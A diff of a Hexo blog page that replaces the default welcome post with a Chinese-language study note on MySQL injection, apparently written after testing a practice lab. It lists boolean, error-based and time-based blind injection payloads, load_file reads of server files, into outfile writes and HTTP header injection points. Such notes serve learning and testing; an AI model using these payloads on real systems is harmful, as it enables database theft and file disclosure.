@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Hello World | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+  <meta name="description" content="记一次环境测试并总结下sql注入前言最近帮老板测试了下他的sql注入联系环境，刚好我也想看看《mysql-injection》,这本sql注入天书，然后总结下写点东西。 开始一般的什么get、post、单引号之类的测试这里就不一一累述了，主要想记录总结下一些开始没怎么学懂的东西。 基于布尔sql盲注1.left(database(),1)&amp;gt;\&amp;apos;s\&amp;apos;  left(a,b)">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://yoursite.com/2017/10/30/hello-world/index.html">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/2017/10/31/sql/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="记一次环境测试并总结下sql注入前言最近帮老板测试了下他的sql注入联系环境，刚好我也想看看《mysql-injection》,这本sql注入天书，然后总结下写点东西。 开始一般的什么get、post、单引号之类的测试这里就不一一累述了，主要想记录总结下一些开始没怎么学懂的东西。 基于布尔sql盲注1.left(database(),1)&amp;gt;\&amp;apos;s\&amp;apos;  left(a,b)">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-10-29T16:51:01.060Z">
+<meta property="og:updated_time" content="2017-06-21T11:15:05.180Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta name="twitter:title" content="Hexo">
+<meta name="twitter:description" content="记一次环境测试并总结下sql注入前言最近帮老板测试了下他的sql注入联系环境，刚好我也想看看《mysql-injection》,这本sql注入天书，然后总结下写点东西。 开始一般的什么get、post、单引号之类的测试这里就不一一累述了，主要想记录总结下一些开始没怎么学懂的东西。 基于布尔sql盲注1.left(database(),1)&amp;gt;\&amp;apos;s\&amp;apos;  left(a,b)">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -154,35 +154,110 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-hello-world" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-sql" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      Hello World
-    </h1>
-  
-
-        
-        <a href="/2017/10/30/hello-world/" class="archive-article-date">
-  	<time datetime="2017-10-29T16:51:01.060Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-30</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+        <h2 id="记一次环境测试并总结下sql注入"><a href="#记一次环境测试并总结下sql注入" class="headerlink" title="记一次环境测试并总结下sql注入"></a>记一次环境测试并总结下sql注入</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近帮老板测试了下他的sql注入联系环境，刚好我也想看看《mysql-injection》,这本sql注入天书，然后总结下写点东西。</p>
+<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>一般的什么get、post、单引号之类的测试这里就不一一累述了，主要想记录总结下一些开始没怎么学懂的东西。</p>
+<h5 id="基于布尔sql盲注"><a href="#基于布尔sql盲注" class="headerlink" title="基于布尔sql盲注"></a>基于布尔sql盲注</h5><pre><code>1.left(database(),1)&gt;\&apos;s\&apos;
+</code></pre><blockquote>
+<p>left(a,b)从左侧截取a的前b位</p>
+<pre><code>2.(ascii(substr((select flag from flag),1,1)))&gt;100 --+
+</code></pre><p>substr(a,b,c)从c位置开始，截取字符串a的c长度<br>ascii()将某个字符转换为ascii值</p>
+</blockquote>
+<pre><code>3.ord(mid((select ifnull(cast(username as char),0x20) from security.user order by id limit 0,1),1,1))&gt;98%23
+</code></pre><blockquote>
+<p>mid(a,b,c)从位置b开始，截取a字符串的c位<br>ord()函数同ascii()，将字符转为ascii值<br>cast(a as b)将a转换为b类型<br>ifnull(a,b)a不是null就取a，是就取b</p>
+</blockquote>
+<pre><code>4.select user() regexp \&apos;^[a-z]\&apos;;
+</code></pre><blockquote>
+<p>正则表达式的用法,user()结果为root,regexp为匹配root的正则表达式。匹配正确为1，不正确为0。</p>
+</blockquote>
+<pre><code>5.select user() like \&apos;ro%\&apos;
+</code></pre><blockquote>
+<p>有则1，没有则0</p>
+</blockquote>
+<h5 id="基于报错的sql盲注——构造payload让信息通过错误提示回显出来"><a href="#基于报错的sql盲注——构造payload让信息通过错误提示回显出来" class="headerlink" title="基于报错的sql盲注——构造payload让信息通过错误提示回显出来"></a>基于报错的sql盲注——构造payload让信息通过错误提示回显出来</h5><p>1.</p>
+<pre><code>select 1,count(*),concat(0x3a,0X3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from infomation_schema.columns group by a;
+</code></pre><blockquote>
+<p>一是concat计数，二是floor，取得0 or 1，进行数据重复，三是group by进行分组，原理好像<br><a href="http://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="external">http://www.cnblogs.com/xdans/p/5412468.html</a>这是一个好文，还有以下变形</p>
+</blockquote>
+<pre><code>select count(*) from information_schema.tables froup by concat(version(),floor(rand(0)*2)) 
+</code></pre><blockquote>
+<p>如果关键点表被禁用了可以使用用户变量来报错</p>
+</blockquote>
+<pre><code>select min(@a=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)
+</code></pre><p>2.</p>
+<pre><code>select exp(~(select * from (select user())a))
+</code></pre><blockquote>
+<p>double数值类型超出范围<br>exp()为以e的底的对数函数:版本在5.5.5及其以上</p>
+</blockquote>
+<p>3.</p>
+<pre><code>select !(select * from (select user())x) - ~0
+</code></pre><blockquote>
+<p>bigint 超出范围：~0是对0逐位取反，版本在5.5.5及其以上</p>
+</blockquote>
+<p>4.</p>
+<pre><code>extractvalue(1,concat(0x7e,(select @@version),0x7e)) se
+</code></pre><blockquote>
+<p>mysql对xml数据进行查询和修改的xpath函数，xpath语法错误</p>
+</blockquote>
+<p>5.</p>
+<pre><code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)
+</code></pre><blockquote>
+<p>mysql对xml数据进行查询和修改的xpath函数，xpath语法错误</p>
+</blockquote>
+<p>6.</p>
+<pre><code>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
+</code></pre><blockquote>
+<p>mysql重复特征，此处重复了version，所以报错。</p>
+</blockquote>
+<p>#####基于时间的sql盲注<br>    1.if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&gt;10,sleep(1),NULL)%23</p>
+<blockquote>
+<p>if(a,b,c) a假则执行b</p>
+</blockquote>
+<pre><code>2.if(ascii(substring((SELECT flag FROM flag),1,1))=119,(select benchmark(10000000,md5(0x41))),1)%23
+</code></pre><blockquote>
+<p>benchmark(a,b)执行b命令a次，算一种ddos推荐sleep</p>
+</blockquote>
+<p>#####load_file()和into outfile()<br>1.load_file()导出文件</p>
+<pre><code>select 1,user(),load_file(\&apos;/var/www/html/db.php\&apos;)
+</code></pre><p>load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
+<p>使用条件：</p>
+<ul>
+<li>必须有读取权限且文件必须完全可读</li>
+<li>欲读文件必须在服务器上</li>
+<li>必须指定文件完整路径(有些课报错爆出绝对路径)</li>
+<li>欲读取文件必须小于max_allowed_packet</li>
+</ul>
+<blockquote>
+<p>可用char()编码后的代替</p>
+<p>或者直接16进制</p>
+<p>/用\\代替（win）</p>
+</blockquote>
+<p>2.文件导入到数据库<br>3.导入到文件<br>select…into outfile \’filename\’</p>
+<h5 id="万能密码就不细说了"><a href="#万能密码就不细说了" class="headerlink" title="万能密码就不细说了"></a>万能密码就不细说了</h5><p>注入方式和get型差不多</p>
+<p>手法和前文说的一样注入点不同而已</p>
+<h5 id="多语句"><a href="#多语句" class="headerlink" title="多语句"></a>多语句</h5><p>能多语句就随便搞嘛</p>
+<h5 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h5><p>前提是数据库对头信息进行了提取并处理</p>
+<p>常见位置：</p>
+<ul>
+<li>user-agent</li>
+<li>cookie</li>
+<li>referer</li>
+</ul>
+<p>工具：</p>
+<ul>
+<li><p>live http headers(firefox)</p>
+</li>
+<li><p>tamper data(firefox)</p>
+</li>
+</ul>
+<p>手法和前文说的一样注入点不同而已</p>
+<h5 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h5><p>后面将新开一篇记录，在此就不累述了。</p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>这次记录了很多注入的手法，有常见的也有不怎么常见的，主要是很早就想好好地记录总结下sql了，借此机会就成热打铁写了这篇文章，其中借鉴不少天书的记录，后面会针对wafbypass做些收集并整理出来。</p>
 
       
 
@@ -262,7 +337,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/10/30/hello-world/" alt="微信分享二维码">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/10/31/sql/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -276,15 +351,20 @@
   
 <nav id="article-nav">
   
-    <a href="/2017/10/30/hello/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2017/10/31/ssrf/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          hello
+          (no title)
         
       </div>
     </a>
   
+  
+    <a href="/2017/10/31/myfound/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
